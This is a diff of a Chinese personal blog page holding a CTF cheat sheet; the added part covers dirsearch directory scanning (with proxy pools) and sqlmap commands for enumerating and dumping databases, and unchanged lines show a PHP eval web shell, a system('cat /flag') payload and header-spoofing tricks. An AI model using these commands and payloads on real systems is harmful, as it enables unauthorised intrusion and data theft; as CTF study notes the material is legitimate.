@@ -29,7 +29,7 @@
 <meta property="og:description" content="信息备注自己快查记录来自哪个网站1234567891011121314151617181920212223242526272829303132333435363738394041X-Forwarded-For:127.0.0.1 X-Forwarded:127.0.0.1 Forwarded-For:127.0.0.1 Forwarded:127.0.0.1 X-Forwarded-Host:12">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-04-15T12:17:00.000Z">
-<meta property="article:modified_time" content="2024-06-25T15:59:48.921Z">
+<meta property="article:modified_time" content="2024-06-26T02:09:21.465Z">
 <meta property="article:author" content="无星">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -256,7 +256,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-06-25 23:59:48" itemprop="dateModified" datetime="2024-06-25T23:59:48+08:00">2024-06-25</time>
+                <time title="修改时间：2024-06-26 10:09:21" itemprop="dateModified" datetime="2024-06-26T10:09:21+08:00">2024-06-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -288,14 +288,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>834</span>
+              <span>2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -317,6 +317,52 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=system(&quot;cat /flag&quot;)</span><br></pre></td></tr></table></figure>
 
+
+
+<h1 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h1><p>扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://222.93.xx.xx:8090</span><br></pre></td></tr></table></figure>
+<p>指定字典扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://222.93.xx.xx:8090 -w dic.txt</span><br></pre></td></tr></table></figure>
+<p>保留200</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://222.93.xx.xx:8090 -i 200</span><br></pre></td></tr></table></figure>
+<p>批量地址扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -l url.txt -i 200</span><br></pre></td></tr></table></figure>
+
+<p>如果遇到https问题</p>
+<p>打开burp，然后设置代理到本机即可</p>
+<p>代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -l url.txt -i 200 --proxy=localhost:8080</span><br></pre></td></tr></table></figure>
+
+<p>代理池</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -l url.txt -i 200 --proxy-file=/path/to/proxies.txt</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><blockquote>
+<p>如果链接不上，尝试换个网络看看</p>
+</blockquote>
+<p>扫描接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxxx?tidId=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>参数好多，只扫某些</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxxx?tidId=1&amp;id=2&amp;pp=3&quot; -p &quot;tidId,id&quot;</span><br></pre></td></tr></table></figure>
+
+<p>ssl问题，同样开burp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://xxxx?tidId=1&amp;id=2&amp;pp=3&quot; -p &quot;tidId,id&quot; -proxy &quot;http://127.0.0.1:8080&quot; --force-ssl</span><br></pre></td></tr></table></figure>
+
+<p>查看所有的数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://xxx/index.php?id=1 --dbs</span><br></pre></td></tr></table></figure>
+
+<p>查看数据中的列表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://xxx/index.php?id=1 -D mysql -tables</span><br></pre></td></tr></table></figure>
+
+<p>查看表中的字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://xxx/index.php?id=1 -D database数据库名 -T table表名 --columns</span><br></pre></td></tr></table></figure>
+
+<p>查看字段内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://xxx/index.php?id=1 -D database数据库名 -T table表名 -C colunm列名 --dump</span><br></pre></td></tr></table></figure>
+
+<p>配置详情</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-p 指定测试参数</span><br><span class="line">-b 获取banner</span><br><span class="line">--is-dba 是否为管理员权限</span><br><span class="line">--current-user 查看当前数据库</span><br><span class="line">--current-user 查看当前用户</span><br><span class="line">--count 检索所有数据数量</span><br><span class="line">--level 测试等级（1-5）默认为1</span><br><span class="line">-v 显示详细信息</span><br><span class="line">-D 指定数据库</span><br><span class="line">-T 指定表</span><br><span class="line">-C 指定列</span><br><span class="line">（大写）</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -354,8 +400,8 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/03/17/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94PlayWright%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/" rel="prev" title="无星的自动化之旅（二）——PlayWright的一些常见问题">
-      <i class="fa fa-chevron-left"></i> 无星的自动化之旅（二）——PlayWright的一些常见问题
+    <a href="/2023/03/17/%E8%87%AA%E5%8A%A8%E5%8C%96/%E6%97%A0%E6%98%9F%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B9%8B%E6%97%85%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94PlayWright%E6%8F%90%E4%BA%A4%E9%80%89%E6%8B%A9%E6%96%87%E4%BB%B6/" rel="prev" title="无星的自动化之旅（三）——PlayWright配置项和常见问题">
+      <i class="fa fa-chevron-left"></i> 无星的自动化之旅（三）——PlayWright配置项和常见问题
     </a></div>
       <div class="post-nav-item">
     <a href="/2023/05/21/%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85/%E6%97%A0%E6%98%9F%E7%9A%84%E5%89%8D%E7%AB%AF%E4%B9%8B%E6%97%85%EF%BC%88%E4%BA%8C%E5%8D%81%E4%B8%83%EF%BC%89%E2%80%94%E2%80%94ts%E8%B7%AF%E5%BE%84alias/" rel="next" title="无星的前端之旅（二十七）——ts路径alias">
@@ -420,7 +466,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E5%A4%87%E6%B3%A8%E8%87%AA%E5%B7%B1%E5%BF%AB%E6%9F%A5"><span class="nav-number">1.</span> <span class="nav-text">信息备注自己快查</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%B0%E5%BD%95%E6%9D%A5%E8%87%AA%E5%93%AA%E4%B8%AA%E7%BD%91%E7%AB%99"><span class="nav-number">2.</span> <span class="nav-text">记录来自哪个网站</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hackbar"><span class="nav-number">3.</span> <span class="nav-text">Hackbar</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E8%AF%B7%E6%B1%82"><span class="nav-number">3.1.</span> <span class="nav-text">php请求</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E5%A4%87%E6%B3%A8%E8%87%AA%E5%B7%B1%E5%BF%AB%E6%9F%A5"><span class="nav-number">1.</span> <span class="nav-text">信息备注自己快查</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AE%B0%E5%BD%95%E6%9D%A5%E8%87%AA%E5%93%AA%E4%B8%AA%E7%BD%91%E7%AB%99"><span class="nav-number">2.</span> <span class="nav-text">记录来自哪个网站</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hackbar"><span class="nav-number">3.</span> <span class="nav-text">Hackbar</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E8%AF%B7%E6%B1%82"><span class="nav-number">3.1.</span> <span class="nav-text">php请求</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dirsearch"><span class="nav-number">4.</span> <span class="nav-text">dirsearch</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap"><span class="nav-number">5.</span> <span class="nav-text">sqlmap</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -436,7 +482,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">138</span>
+          <span class="site-state-item-count">137</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -531,13 +577,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">275k</span>
+    <span title="站点总字数">276k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:10</span>
+    <span title="站点阅读时长">4:11</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
